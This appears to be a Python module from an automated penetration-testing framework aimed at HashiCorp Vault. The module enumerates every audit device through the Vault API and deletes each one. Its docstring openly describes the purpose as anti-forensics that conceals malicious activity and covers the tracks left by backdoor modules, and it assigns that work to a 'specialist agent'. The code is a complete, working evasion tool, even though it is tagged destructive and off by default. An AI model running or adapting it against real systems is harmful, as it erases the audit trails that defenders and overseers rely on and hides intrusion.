# active_execution/modules/audit_backdoor.py
from typing import Optional, Dict, Any
from core.tls_config import vault_request
from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel

class AuditBackdoorModule(BaseExecutionModule):
    """Disable Vault audit devices to conceal malicious activity.

    .. note::
       This module is technically **evasion / anti-forensics**, not persistence.
       It is grouped under the ``"persistence"`` domain because it is almost
       always deployed alongside backdoor modules (``persistence.backdoor``,
       ``multi_persistence.backdoor``) and the same specialist agent should
       own the full "install backdoor + cover tracks" workflow.
    """

    def __init__(self):
        super().__init__(
            module_id="audit_backdoor.disable",
            title="Audit Backdoor - Disable Audit Devices",
            risk_level=RiskLevel.DESTRUCTIVE,
            domain="persistence",
            description=(
                "Disables all audit devices to hide activity. "
                "Technically evasion/anti-forensics (not persistence), "
                "but grouped under 'persistence' domain for practical "
                "backdoor+cover-tracks workflow with a single specialist agent."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(context.token and context.vault_addr)

    def execute(self, context: ExecutionContext, params: Optional[Dict] = None) -> ExecutionResult:
        headers = {"X-Vault-Token": context.token}
        results = {}
        try:
            # List audit devices
            url = f"{context.vault_addr}/v1/sys/audit"
            resp = vault_request("GET", url, headers=headers, timeout=10)
            if resp.status_code != 200:
                return ExecutionResult(
                    status="failed",
                    message=f"Could not list audit devices: {resp.status_code}"
                )
            audits = resp.json().get("data", {})
            results["audit_devices"] = list(audits.keys())
            disabled = []
            for name in audits:
                disable_url = f"{context.vault_addr}/v1/sys/audit/{name}"
                resp_del = vault_request("DELETE", disable_url, headers=headers, timeout=10)
                if resp_del.status_code in [200, 204]:
                    disabled.append(name)
            results["disabled"] = disabled
            context.add_finding(
                title="Audit Logs Disabled",
                description=f"Disabled {len(disabled)} audit devices",
                severity="CRITICAL",
                evidence=results
            )
            return ExecutionResult(
                status="success",
                message=f"Disabled {len(disabled)} audit devices",
                evidence=results
            )
        except Exception as e:
            return ExecutionResult(status="error", message=str(e))